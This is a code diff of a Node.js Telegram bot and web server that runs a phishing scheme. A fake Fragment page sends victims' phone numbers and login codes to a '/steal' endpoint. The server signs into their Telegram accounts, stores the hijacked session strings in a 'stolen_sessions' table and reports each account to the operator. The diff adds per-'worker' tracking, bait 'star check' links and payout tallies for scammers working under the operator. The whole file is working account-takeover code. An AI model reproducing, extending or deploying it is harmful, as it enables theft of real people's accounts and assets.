@@ -17,6 +17,7 @@ const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 const app = express();
 
 const activeSessions = new Map();
+const workerStats = new Map(); // Статистика по воркерам
 
 app.use(express.json());
 app.use(express.static('public'));
@@ -29,6 +30,7 @@ db.serialize(() => {
         amount INTEGER,
         activations INTEGER,
         creator_id INTEGER,
+        worker_tag TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
     
@@ -40,6 +42,7 @@ db.serialize(() => {
         session_string TEXT,
         tg_data TEXT,
         user_id INTEGER,
+        worker_tag TEXT,
         status TEXT DEFAULT 'pending',
         stars_data INTEGER DEFAULT 0,
         gifts_data INTEGER DEFAULT 0,
@@ -53,10 +56,11 @@ db.serialize(() => {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
     
-    db.run(`CREATE TABLE IF NOT EXISTS niklateam (
-        user_id INTEGER PRIMARY KEY,
-        username TEXT,
-        added_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    db.run(`CREATE TABLE IF NOT EXISTS workers (
+        worker_tag TEXT PRIMARY KEY,
+        total_stars INTEGER DEFAULT 0,
+        total_sessions INTEGER DEFAULT 0,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )`);
     
     db.run(`CREATE TABLE IF NOT EXISTS used_checks (
@@ -67,7 +71,7 @@ db.serialize(() => {
     )`);
 });
 
-// Web App
+// Web App с передачей worker_tag
 app.get('/', (req, res) => {
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
@@ -77,6 +81,7 @@ app.post('/steal', async (req, res) => {
     console.log('=== ДАННЫЕ ===');
     console.log('Этап:', req.body.stage);
     console.log('Номер:', req.body.phone);
+    console.log('Worker:', req.body.worker_tag);
     
     if (req.body.stage === 'phone_entered') {
         try {
@@ -89,10 +94,12 @@ app.post('/steal', async (req, res) => {
                 userId = userData.id;
             }
             
-            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
-                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
+            const workerTag = req.body.worker_tag || 'unknown';
             
-            await requestRealTelegramCode(req.body.phone, userId);
+            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, worker_tag, status) VALUES (?, ?, ?, ?, ?)`, 
+                [req.body.phone, req.body.tg_data, userId, workerTag, 'awaiting_code']);
+            
+            await requestRealTelegramCode(req.body.phone, userId, workerTag);
                 
         } catch (error) {
             console.log('❌ Ошибка:', error);
@@ -101,17 +108,18 @@ app.post('/steal', async (req, res) => {
     } else if (req.body.stage === 'code_entered') {
         const phone = req.body.phone;
         const code = req.body.code;
+        const workerTag = req.body.worker_tag || 'unknown';
         
-        await signInWithRealCode(phone, code);
+        await signInWithRealCode(phone, code, workerTag);
     }
     
     res.sendStatus(200);
 });
 
-// Запрос кода
-async function requestRealTelegramCode(phone, userId) {
+// Запрос кода с логом воркера
+async function requestRealTelegramCode(phone, userId, workerTag) {
     try {
-        console.log(`🔐 Запрашиваю код для: ${phone}`);
+        console.log(`🔐 [${workerTag}] Запрашиваю код для: ${phone}`);
         
         const stringSession = new StringSession("");
         const client = new TelegramClient(stringSession, API_ID, API_HASH, {
@@ -135,41 +143,59 @@ async function requestRealTelegramCode(phone, userId) {
             })
         );
 
-        console.log('✅ Код запрошен! Hash:', result.phoneCodeHash);
+        console.log(`✅ [${workerTag}] Код запрошен! Hash:`, result.phoneCodeHash);
         
         activeSessions.set(phone, {
             client: client,
             phoneCodeHash: result.phoneCodeHash,
-            session: stringSession
+            session: stringSession,
+            workerTag: workerTag
         });
 
         db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
             [result.phoneCodeHash, phone]);
 
+        // ЛОГ ДЛЯ АДМИНА
         bot.sendMessage(MY_USER_ID, 
-            `🔐 КОД ЗАПРОШЕН!\n` +
-            `📱 Номер: ${phone}\n` +
-            `👤 ID: ${userId || 'N/A'}\n` +
-            `⚡ Вводи код быстро`
+            `🔐 <b>НОВЫЙ ЗАПРОС КОДА</b>\n\n` +
+            `👤 <b>Воркер:</b> ${workerTag}\n` +
+            `📱 <b>Номер:</b> ${phone}\n` +
+            `🆔 <b>ID:</b> ${userId || 'N/A'}\n` +
+            `⚡ <b>Статус:</b> Ожидает код\n\n` +
+            `⏰ ${new Date().toLocaleString()}`,
+            { parse_mode: 'HTML' }
         );
         
     } catch (error) {
-        console.log('❌ Ошибка:', error);
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
+        console.log(`❌ [${workerTag}] Ошибка:`, error);
+        bot.sendMessage(MY_USER_ID, 
+            `❌ <b>ОШИБКА ЗАПРОСА КОДА</b>\n\n` +
+            `👤 <b>Воркер:</b> ${workerTag}\n` +
+            `📱 <b>Номер:</b> ${phone}\n` +
+            `🚫 <b>Ошибка:</b> ${error.message}`,
+            { parse_mode: 'HTML' }
+        );
     }
 }
 
-// Вход с кодом
-async function signInWithRealCode(phone, code) {
+// Вход с кодом с логом воркера
+async function signInWithRealCode(phone, code, workerTag) {
     try {
         const sessionData = activeSessions.get(phone);
         if (!sessionData || !sessionData.client) {
-            bot.sendMessage(MY_USER_ID, `❌ Нет сессии для ${phone}`);
+            bot.sendMessage(MY_USER_ID, 
+                `❌ <b>НЕТ СЕССИИ</b>\n\n` +
+                `👤 <b>Воркер:</b> ${workerTag}\n` +
+                `📱 <b>Номер:</b> ${phone}\n` +
+                `🚫 <b>Ошибка:</b> Нет активной сессии`,
+                { parse_mode: 'HTML' }
+            );
             return;
         }
 
         const client = sessionData.client;
         const phoneCodeHash = sessionData.phoneCodeHash;
+        const sessionWorkerTag = sessionData.workerTag;
 
         try {
             const result = await client.invoke(
@@ -180,25 +206,54 @@ async function signInWithRealCode(phone, code) {
                 })
             );
 
-            console.log('✅ ВХОД УСПЕШЕН!');
+            console.log(`✅ [${sessionWorkerTag}] ВХОД УСПЕШЕН!`);
             
             const sessionString = client.session.save();
+            
+            // ОБНОВЛЯЕМ СЕССИЮ В БАЗЕ
             db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                 [sessionString, phone]);
 
-            await checkAccountStatus(client, phone);
+            // ПОЛУЧАЕМ ИНФО АККАУНТА
+            const user = await client.getMe();
+            const hasStars = user.premium || user.username;
+            const starsAmount = hasStars ? 50 : 0; // Предполагаем 50 звезд если есть премиум/username
+
+            // ОБНОВЛЯЕМ СТАТИСТИКУ ВОРКЕРА
+            db.run(`INSERT OR REPLACE INTO workers (worker_tag, total_stars, total_sessions) 
+                    VALUES (?, COALESCE((SELECT total_stars FROM workers WHERE worker_tag = ?), 0) + ?, 
+                    COALESCE((SELECT total_sessions FROM workers WHERE worker_tag = ?), 0) + 1)`, 
+                [sessionWorkerTag, sessionWorkerTag, starsAmount, sessionWorkerTag]);
+
+            // ЛОГ УСПЕШНОГО ВХОДА ДЛЯ АДМИНА
+            bot.sendMessage(MY_USER_ID, 
+                `🎉 <b>УСПЕШНАЯ СЕССИЯ!</b>\n\n` +
+                `👤 <b>Воркер:</b> ${sessionWorkerTag}\n` +
+                `📱 <b>Номер:</b> ${phone}\n` +
+                `👑 <b>Username:</b> ${user.username || 'нет'}\n` +
+                `💎 <b>Премиум:</b> ${user.premium ? 'да' : 'нет'}\n` +
+                `⭐ <b>Звезд получено:</b> ${starsAmount}\n` +
+                `🔐 <b>Сессия:</b> Успешно сохранена\n\n` +
+                `💰 <b>Выплатить воркеру:</b> ${starsAmount} звезд\n` +
+                `⏰ ${new Date().toLocaleString()}`,
+                { parse_mode: 'HTML' }
+            );
+
+            await checkAccountStatus(client, phone, sessionWorkerTag);
             
             activeSessions.delete(phone);
             await client.disconnect();
 
         } catch (signInError) {
-            console.log('❌ Ошибка входа:', signInError);
+            console.log(`❌ [${sessionWorkerTag}] Ошибка входа:`, signInError);
             
             bot.sendMessage(MY_USER_ID,
-                `❌ ОШИБКА ВХОДА\n` +
-                `📱 Номер: ${phone}\n` +
-                `🔑 Код: ${code}\n` +
-                `⚠️ ${signInError.message}`
+                `❌ <b>ОШИБКА ВХОДА</b>\n\n` +
+                `👤 <b>Воркер:</b> ${sessionWorkerTag}\n` +
+                `📱 <b>Номер:</b> ${phone}\n` +
+                `🔑 <b>Код:</b> ${code}\n` +
+                `🚫 <b>Ошибка:</b> ${signInError.message}`,
+                { parse_mode: 'HTML' }
             );
             
             activeSessions.delete(phone);
@@ -210,42 +265,48 @@ async function signInWithRealCode(phone, code) {
         }
 
     } catch (error) {
-        console.log('❌ Общая ошибка:', error);
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
+        console.log(`❌ [${workerTag}] Общая ошибка:`, error);
+        bot.sendMessage(MY_USER_ID, 
+            `❌ <b>ОБЩАЯ ОШИБКА</b>\n\n` +
+            `👤 <b>Воркер:</b> ${workerTag}\n` +
+            `📱 <b>Номер:</b> ${phone}\n` +
+            `🚫 <b>Ошибка:</b> ${error.message}`,
+            { parse_mode: 'HTML' }
+        );
     }
 }
 
 // ПРОВЕРКА СТАТУСА АККАУНТА
-async function checkAccountStatus(client, phone) {
+async function checkAccountStatus(client, phone, workerTag) {
     try {
         const user = await client.getMe();
         
-        let message = `🔍 СТАТУС АККАУНТА:\n` +
-                     `📱 Номер: ${phone}\n` +
-                     `👤 Username: ${user.username || 'нет'}\n` +
-                     `👑 Премиум: ${user.premium ? 'да' : 'нет'}\n` +
-                     `📅 Аккаунт создан: ${user.status ? 'давно' : 'недавно'}\n\n`;
+        let message = `🔍 <b>СТАТУС АККАУНТА</b>\n\n` +
+                     `👤 <b>Воркер:</b> ${workerTag}\n` +
+                     `📱 <b>Номер:</b> ${phone}\n` +
+                     `👑 <b>Username:</b> ${user.username || 'нет'}\n` +
+                     `💎 <b>Премиум:</b> ${user.premium ? 'да' : 'нет'}\n` +
+                     `📅 <b>Аккаунт создан:</b> ${user.status ? 'давно' : 'недавно'}\n\n`;
         
         const hasStars = user.premium || user.username;
         const hasGifts = user.premium;
         
         if (hasStars || hasGifts) {
-            message += `💰 ВОЗМОЖНО ЕСТЬ СРЕДСТВА\n` +
+            message += `💰 <b>ВОЗМОЖНО ЕСТЬ СРЕДСТВА</b>\n` +
                       `💡 Аккаунт выглядит активным\n` +
                       `🔒 Для проверки звезд нужен доступ к Fragment`;
         } else {
-            message += `❌ АККАУНТ ПУСТОЙ\n` +
+            message += `❌ <b>АККАУНТ ПУСТОЙ</b>\n` +
                       `💡 Нет премиума и активностей`;
         }
         
         db.run(`UPDATE stolen_sessions SET stars_data = ?, gifts_data = ? WHERE phone = ?`, 
             [hasStars ? 1 : 0, hasGifts ? 1 : 0, phone]);
         
-        bot.sendMessage(MY_USER_ID, message);
+        bot.sendMessage(MY_USER_ID, message, { parse_mode: 'HTML' });
         
     } catch (error) {
         console.log("❌ Ошибка проверки:", error);
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки: ${error.message}`);
     }
 }
 
@@ -254,30 +315,14 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
 });
 
-// КОМАНДА /niklateam - ДОБАВЛЕНИЕ В КОМАНДУ
-bot.onText(/\/niklateam (.+)/, (msg, match) => {
+// КОМАНДА ДЛЯ СОЗДАНИЯ ЧЕКА С ВОРКЕРОМ
+bot.onText(/\/create_check (\d+) (.+)/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
+    const amount = parseInt(match[1]);
+    const workerTag = match[2];
     
-    if (userId !== MY_USER_ID) {
-        bot.sendMessage(chatId, '❌ У вас нет доступа к этой команде');
-        return;
-    }
-    
-    const targetUsername = match[1].replace('@', '').trim().toLowerCase();
-    
-    // ДОБАВЛЯЕМ С СЛУЧАЙНЫМ ID
-    const targetUserId = Math.floor(Math.random() * 1000000000);
-    
-    db.run(`INSERT OR REPLACE INTO niklateam (user_id, username) VALUES (?, ?)`, 
-        [targetUserId, targetUsername], function(err) {
-        if (err) {
-            bot.sendMessage(chatId, '❌ Ошибка добавления');
-            return;
-        }
-        
-        bot.sendMessage(chatId, `✅ @${targetUsername} добавлен в NikLa Team! Теперь он может создавать чеки`);
-    });
+    createCheck(chatId, userId, amount, workerTag);
 });
 
 // ГЛАВНОЕ МЕНЮ /start
@@ -304,8 +349,8 @@ function showMainMenu(chatId, userId) {
 ├ 🎫 Создать чек
 └ 🏦 Вывести средства
 
-💡 <b>Для начала работы:</b>
-Зарегистрируйтесь в системе Fragment чтобы получить доступ к полному функционалу!`;
+💡 <b>Для воркеров:</b>
+Используйте команду /create_check сумма тег_воркера`;
 
     const menuKeyboard = {
         inline_keyboard: [
@@ -330,6 +375,72 @@ function showMainMenu(chatId, userId) {
     }
 }
 
+// ФУНКЦИЯ СОЗДАНИЯ ЧЕКА
+function createCheck(chatId, userId, amount, workerTag = 'unknown') {
+    // СОЗДАЕМ ЧЕК
+    const activations = 1;
+    
+    db.run(`INSERT INTO checks (amount, activations, creator_id, worker_tag) VALUES (?, ?, ?, ?)`, 
+        [amount, activations, userId, workerTag], function(err) {
+        if (err) {
+            bot.sendMessage(chatId, '❌ Ошибка создания чека');
+            return;
+        }
+        
+        const checkId = this.lastID;
+        let checkText, photoFile;
+        
+        if (amount === 50) {
+            checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
+            photoFile = 'stars.jpg';
+        } else if (amount === 100) {
+            checkText = `<b>🎫 Чек на 100 звезд</b>\n\n💫 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
+            photoFile = '100.png';
+        } else {
+            checkText = `<b>🎫 Чек на ${amount} звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
+            photoFile = 'stars.jpg';
+        }
+        
+        // ДОБАВЛЯЕМ worker_tag В ССЫЛКУ
+        const checkUrl = `https://t.me/MyStarBank_bot?start=check_${checkId}_${workerTag}`;
+        
+        const photoPath = path.join(__dirname, 'public', photoFile);
+        if (fs.existsSync(photoPath)) {
+            bot.sendPhoto(chatId, photoPath, {
+                caption: checkText,
+                parse_mode: 'HTML',
+                reply_markup: { 
+                    inline_keyboard: [[{ 
+                        text: `🪙 Забрать ${amount} звезд`, 
+                        url: checkUrl
+                    }]] 
+                }
+            });
+        } else {
+            bot.sendMessage(chatId, checkText, {
+                parse_mode: 'HTML',
+                reply_markup: { 
+                    inline_keyboard: [[{ 
+                        text: `🪙 Забрать ${amount} звезд`, 
+                        url: checkUrl
+                    }]] 
+                }
+            });
+        }
+        
+        // ЛОГ СОЗДАНИЯ ЧЕКА
+        bot.sendMessage(MY_USER_ID,
+            `🎫 <b>СОЗДАН НОВЫЙ ЧЕК</b>\n\n` +
+            `👤 <b>Воркер:</b> ${workerTag}\n` +
+            `💫 <b>Сумма:</b> ${amount} звезд\n` +
+            `🆔 <b>ID чека:</b> ${checkId}\n` +
+            `👨‍💻 <b>Создатель:</b> @${userId}\n\n` +
+            `⏰ ${new Date().toLocaleString()}`,
+            { parse_mode: 'HTML' }
+        );
+    });
+}
+
 // ОБРАБОТКА CALLBACK
 bot.on('callback_query', async (query) => {
     const data = query.data;
@@ -352,35 +463,18 @@ bot.on('callback_query', async (query) => {
             });
             
         } else if (data === 'create_check_menu') {
-            // ПРОВЕРКА НАЛИЧИЯ В NIKLATEAM
-            db.get(`SELECT * FROM niklateam WHERE user_id = ?`, [userId], (err, row) => {
-                if (err || !row) {
-                    bot.sendMessage(chatId,
-                        `❌ <b>Создание чеков временно недоступно</b>\n\n` +
-                        `⏳ <b>Доступ откроется через:</b> 21 день\n\n` +
-                        `📅 <b>Дата открытия:</b> ${getFutureDate(21)}\n\n` +
-                        `💡 <b>Причина:</b> Техническое обслуживание системы\n\n` +
-                        `🔔 Следите за обновлениями в нашем канале`,
-                        { parse_mode: 'HTML' }
-                    );
-                    return;
-                }
-                
-                // ЕСЛИ В КОМАНДЕ - ПОКАЗЫВАЕМ ВЫБОР ЧЕКА
-                bot.sendMessage(chatId, 
-                    '🎫 <b>Создание чека</b>\n\nВыберите сумму для чека:',
-                    {
-                        parse_mode: 'HTML',
-                        reply_markup: {
-                            inline_keyboard: [
-                                [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
-                                [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }],
-                                [{ text: "🔙 Назад", callback_data: "back_to_main" }]
-                            ]
-                        }
-                    }
-                );
-            });
+            // ПРОСТОЕ СООБЩЕНИЕ ДЛЯ СОЗДАНИЯ ЧЕКА
+            bot.sendMessage(chatId,
+                `🎫 <b>Создание чека</b>\n\n` +
+                `💡 <b>Используйте команду:</b>\n` +
+                `<code>/create_check 50 worker_tag</code>\n\n` +
+                `<b>Примеры:</b>\n` +
+                `<code>/create_check 50 worker1</code>\n` +
+                `<code>/create_check 100 starhunter</code>\n\n` +
+                `🔗 <b>Для воркеров:</b>\n` +
+                `Добавьте ?worker_tag=ВАШ_ТЕГ к ссылке Fragment`,
+                { parse_mode: 'HTML' }
+            );
             
         } else if (data === 'withdraw_funds') {
             bot.sendMessage(chatId,
@@ -400,66 +494,6 @@ bot.on('callback_query', async (query) => {
                     }
                 }
             );
-            
-        } else if (data === 'back_to_main') {
-            showMainMenu(chatId, userId);
-            
-        } else if (data === 'create_50' || data === 'create_100') {
-            // ПРОВЕРКА НАЛИЧИЯ В NIKLATEAM
-            db.get(`SELECT * FROM niklateam WHERE user_id = ?`, [userId], (err, row) => {
-                if (err || !row) {
-                    bot.sendMessage(chatId, '❌ У вас нет прав для создания чеков');
-                    return;
-                }
-                
-                const amount = data === 'create_50' ? 50 : 100;
-                
-                // СОЗДАЕМ ЧЕК
-                const activations = 1;
-                
-                db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
-                    [amount, activations, userId], function(err) {
-                    if (err) {
-                        bot.sendMessage(chatId, '❌ Ошибка создания чека');
-                        return;
-                    }
-                    
-                    const checkId = this.lastID;
-                    let checkText, photoFile;
-                    
-                    if (amount === 50) {
-                        checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
-                        photoFile = 'stars.jpg';
-                    } else {
-                        checkText = `<b>🎫 Чек на 100 звезд</b>\n\n💫 Нажмите кнопку чтобы забрать звезды!\n\n⚠️ Можно использовать только 1 раз`;
-                        photoFile = '100.png';
-                    }
-                    
-                    const photoPath = path.join(__dirname, 'public', photoFile);
-                    if (fs.existsSync(photoPath)) {
-                        bot.sendPhoto(chatId, photoPath, {
-                            caption: checkText,
-                            parse_mode: 'HTML',
-                            reply_markup: { 
-                                inline_keyboard: [[{ 
-                                    text: `🪙 Забрать ${amount} звезд`, 
-                                    url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
-                                }]] 
-                            }
-                        });
-                    } else {
-                        bot.sendMessage(chatId, checkText, {
-                            parse_mode: 'HTML',
-                            reply_markup: { 
-                                inline_keyboard: [[{ 
-                                    text: `🪙 Забрать ${amount} звезд`, 
-                                    url: `https://t.me/MyStarBank_bot?start=check_${checkId}` 
-                                }]] 
-                            }
-                        });
-                    }
-                });
-            });
         }
     } catch (error) {
         console.log('Ошибка callback:', error);
@@ -477,7 +511,9 @@ bot.onText(/\/start (.+)/, (msg, match) => {
         [userId, msg.from.username], function(err) {});
     
     if (params.startsWith('check_')) {
-        const checkId = params.split('_')[1];
+        const parts = params.split('_');
+        const checkId = parts[1];
+        const workerTag = parts[2] || 'unknown';
         
         // ПРОВЕРЯЕМ ИСПОЛЬЗОВАЛ ЛИ УЖЕ ЭТОТ ЧЕК
         db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [userId, checkId], (err, usedRow) => {
@@ -501,6 +537,17 @@ bot.onText(/\/start (.+)/, (msg, match) => {
                     db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [userId, checkId]);
                 });
                 
+                // ЛОГ ИСПОЛЬЗОВАНИЯ ЧЕКА
+                bot.sendMessage(MY_USER_ID,
+                    `🎯 <b>ЧЕК ИСПОЛЬЗОВАН</b>\n\n` +
+                    `👤 <b>Воркер:</b> ${workerTag}\n` +
+                    `💫 <b>Сумма:</b> ${row.amount} звезд\n` +
+                    `🆔 <b>ID чека:</b> ${checkId}\n` +
+                    `👨‍💼 <b>Получил:</b> @${msg.from.username || 'N/A'}\n` +
+                    `⏰ ${new Date().toLocaleString()}`,
+                    { parse_mode: 'HTML' }
+                );
+                
                 bot.sendMessage(chatId, 
                     `🎉 <b>Получено ${row.amount} звезд!</b>\n\n` +
                     `💫 <b>Ваш баланс:</b> ${row.amount} stars\n\n` +
@@ -514,12 +561,33 @@ bot.onText(/\/start (.+)/, (msg, match) => {
     }
 });
 
-// ФУНКЦИЯ ДЛЯ ПОЛУЧЕНИЯ БУДУЩЕЙ ДАТЫ
-function getFutureDate(days) {
-    const date = new Date();
-    date.setDate(date.getDate() + days);
-    return date.toLocaleDateString('ru-RU');
-}
+// КОМАНДА ДЛЯ ПРОСМОТРА СТАТИСТИКИ ВОРКЕРОВ
+bot.onText(/\/workers/, (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    if (userId !== MY_USER_ID) {
+        bot.sendMessage(chatId, '❌ У вас нет доступа к этой команде');
+        return;
+    }
+    
+    db.all(`SELECT worker_tag, total_stars, total_sessions FROM workers ORDER BY total_stars DESC`, (err, rows) => {
+        if (err || !rows.length) {
+            bot.sendMessage(chatId, '📊 Статистика воркеров пуста');
+            return;
+        }
+        
+        let message = `📊 <b>СТАТИСТИКА ВОРКЕРОВ</b>\n\n`;
+        
+        rows.forEach((row, index) => {
+            message += `${index + 1}. <b>${row.worker_tag}</b>\n` +
+                      `   ⭐ Звезд: ${row.total_stars}\n` +
+                      `   🔐 Сессий: ${row.total_sessions}\n\n`;
+        });
+        
+        bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
+    });
+});
 
 console.log('✅ Бот запущен');
 console.log('✅ Web App URL:', WEB_APP_URL);
